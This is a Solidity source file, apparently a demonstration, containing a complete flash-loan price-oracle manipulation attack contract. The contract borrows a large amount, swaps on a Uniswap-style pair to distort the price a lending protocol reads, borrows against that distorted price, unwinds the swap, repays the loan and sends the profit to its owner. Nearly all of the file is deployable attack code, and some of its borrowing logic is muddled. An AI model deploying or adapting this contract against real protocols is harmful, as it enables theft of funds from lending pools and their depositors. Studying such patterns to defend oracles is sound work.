// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

/**
 * @title FlashLoanExample
 * @dev Example of a flash loan attack pattern
 * 
 * VULNERABILITY: Price oracle manipulation via flash loan
 */

interface IERC20 {
    function balanceOf(address account) external view returns (uint256);
    function transfer(address to, uint256 amount) external returns (bool);
    function approve(address spender, uint256 amount) external returns (bool);
    function transferFrom(address from, address to, uint256 amount) external returns (bool);
}

interface IFlashLender {
    function flashLoan(
        address receiver,
        address token,
        uint256 amount,
        bytes calldata data
    ) external returns (bool);
}

interface IUniswapV2Pair {
    function swap(uint amount0Out, uint amount1Out, address to, bytes calldata data) external;
    function getReserves() external view returns (uint112 reserve0, uint112 reserve1, uint32 blockTimestampLast);
}

interface IVulnerableLending {
    function getPrice(address token) external view returns (uint256);
    function borrow(address token, uint256 amount) external;
    function collateralValue(address user) external view returns (uint256);
}

/**
 * @title FlashLoanAttack
 * @dev Demonstrates flash loan price manipulation attack
 * 
 * Attack flow:
 * 1. Flash borrow large amount
 * 2. Swap to manipulate AMM price (used as oracle)
 * 3. Exploit protocol at manipulated price
 * 4. Reverse swap
 * 5. Repay flash loan with profit
 */
contract FlashLoanAttack {
    IFlashLender public lender;
    IUniswapV2Pair public pair;
    IVulnerableLending public target;
    IERC20 public token0;
    IERC20 public token1;
    
    address public owner;
    uint256 public profit;
    
    constructor(
        address _lender,
        address _pair,
        address _target,
        address _token0,
        address _token1
    ) {
        lender = IFlashLender(_lender);
        pair = IUniswapV2Pair(_pair);
        target = IVulnerableLending(_target);
        token0 = IERC20(_token0);
        token1 = IERC20(_token1);
        owner = msg.sender;
    }
    
    function attack(uint256 borrowAmount) external {
        require(msg.sender == owner, "Only owner");
        
        uint256 balanceBefore = token0.balanceOf(address(this));
        
        // Step 1: Flash borrow
        lender.flashLoan(
            address(this),
            address(token0),
            borrowAmount,
            abi.encode("ATTACK")
        );
        
        // Calculate profit
        profit = token0.balanceOf(address(this)) - balanceBefore;
    }
    
    function onFlashLoan(
        address initiator,
        address token,
        uint256 amount,
        uint256 fee,
        bytes calldata data
    ) external returns (bytes32) {
        require(msg.sender == address(lender), "Only lender");
        require(initiator == address(this), "Only self");
        
        // Step 2: Swap to manipulate price
        // Large swap moves AMM price significantly
        token0.transfer(address(pair), amount);
        
        (uint112 reserve0, uint112 reserve1,) = pair.getReserves();
        uint256 amountOut = getAmountOut(amount, reserve0, reserve1);
        
        pair.swap(0, amountOut, address(this), "");
        
        // Step 3: Exploit at manipulated price
        // Price is now artificially low, borrow more than should be allowed
        target.borrow(address(token0), amount * 2);
        
        // Step 4: Reverse swap (restore price)
        token1.transfer(address(pair), token1.balanceOf(address(this)));
        (reserve0, reserve1,) = pair.getReserves();
        amountOut = getAmountOut(token1.balanceOf(address(pair)) - reserve1, reserve1, reserve0);
        pair.swap(amountOut, 0, address(this), "");
        
        // Step 5: Repay flash loan
        token0.transfer(address(lender), amount + fee);
        
        return keccak256("ERC3156FlashBorrower.onFlashLoan");
    }
    
    function getAmountOut(uint256 amountIn, uint256 reserveIn, uint256 reserveOut) 
        internal pure returns (uint256) 
    {
        uint256 amountInWithFee = amountIn * 997;
        uint256 numerator = amountInWithFee * reserveOut;
        uint256 denominator = reserveIn * 1000 + amountInWithFee;
        return numerator / denominator;
    }
    
    function withdrawProfit() external {
        require(msg.sender == owner, "Only owner");
        token0.transfer(owner, token0.balanceOf(address(this)));
        token1.transfer(owner, token1.balanceOf(address(this)));
    }
}
